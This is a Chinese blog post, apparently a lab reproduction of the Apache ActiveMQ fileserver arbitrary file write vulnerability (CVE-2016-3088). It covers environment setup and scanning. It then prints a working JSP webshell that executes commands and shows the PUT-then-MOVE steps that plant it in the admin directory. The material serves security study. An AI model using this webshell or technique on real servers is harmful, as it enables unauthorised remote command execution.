**目录**

[Apache ActiveMQ](#t0 "Apache ActiveMQ")

[一、漏洞描述](#t1 "一、漏洞描述")

[二、漏洞影响版本](#t2 "二、漏洞影响版本")

[三、漏洞环境搭建](#t3 "三、漏洞环境搭建")

[四、漏洞复现](#t4 "四、漏洞复现")

* * *

Apache ActiveMQ
---------------

[Apache](https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020) ActiveMQ是Apache软件基金会所研发的开放源代码消息中间件；

### **一、漏洞描述**

该漏洞出现在 fileserver 应用中,漏洞原理：[ActiveMQ](https://so.csdn.net/so/search?q=ActiveMQ&spm=1001.2101.3001.7020)中的fileserver服务允许用户通过HTTP PUT方法上传文件到指定目录。Fileserver支持写入文件(不解析jsp)，但是支持移动文件(Move)我们可以将jsp的文件PUT到Fileserver下,然后再通过Move指令移动到可执行目录下访问。

### **二、漏洞影响版本**

Apache ActiveMQ 5.0.0 - 5.13.2

### **三、漏洞环境搭建**

1、官网下载 apache-activemq-5.7.0-bin.tar 下载地址:http://activemq.apache.org/download-archives.html

2、解压 ，进入其 bin 目录下,运行 ./activemq start

![](https://img-blog.csdnimg.cn/20191224151742110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

3、浏览器访问8161端口，如下图所示可以看到成功搭建环境

![](https://img-blog.csdnimg.cn/20191224152046252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

4、nmap扫描，8161是ActiveMQ的后台服务的管理端口，61616是ActiveMQ的服务端口。

![](https://img-blog.csdnimg.cn/20191224152236233.png)

### **四、漏洞复现**

使用PUT方法上传如下木马代码到目标机器的 /fileserver/1.jsp 。以下代码可以换成其他的jsp木马。

```
<%@ page import="java.io.*"%>      
<%      
 out.print("Hello</br>");      
 String strcmd=request.getParameter("cmd");      
 String line=null;      
 Process p=Runtime.getRuntime().exec(strcmd);      
 BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));      
 while((line=br.readLine())!=null){      
  out.print(line+"</br>");      1
 }      1
%>
```


![](https://img-blog.csdnimg.cn/20191225171413246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问上传的路径，如图，上传成功

![](https://img-blog.csdnimg.cn/20191225171444359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用报错，爆出Web站点的绝对路径

![](https://img-blog.csdnimg.cn/20191225171517850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用MOVE方法将木马文件移到Web站点的admin目录下

![](https://img-blog.csdnimg.cn/20191225172019660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

访问admin下的木马文件，如图，成功获取权限。

![](https://img-blog.csdnimg.cn/2019122517205690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)v![](https://img-blog.csdnimg.cn/20191225172116993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现](https://www.cnblogs.com/yuzly/p/11278131.html "Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现")